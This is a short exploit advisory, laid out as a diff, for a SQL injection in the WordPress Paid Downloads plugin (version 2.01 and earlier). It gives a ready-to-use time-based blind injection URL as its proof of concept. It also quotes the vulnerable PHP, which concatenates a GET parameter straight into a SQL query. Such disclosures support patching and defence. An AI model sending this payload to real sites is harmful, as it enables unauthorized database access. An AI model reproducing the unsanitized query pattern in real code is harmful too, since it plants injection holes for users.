@@ -1,0 +1,18 @@
+# Exploit Title: WordPress Paid Downloads plugin <= 2.01 SQL Injection Vulnerability
+# Date: 2011-09-07
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/paid-downloads.2.01.zip
+# Version: 2.01 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/paid-downloads/download.php?download_key=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+$download_key = $_GET["download_key"];
+$sql = "SELECT * FROM ".$wpdb->prefix."pd_downloadlinks WHERE download_key = '".$download_key."'";
+$link_details = $wpdb->get_row($sql, ARRAY_A);
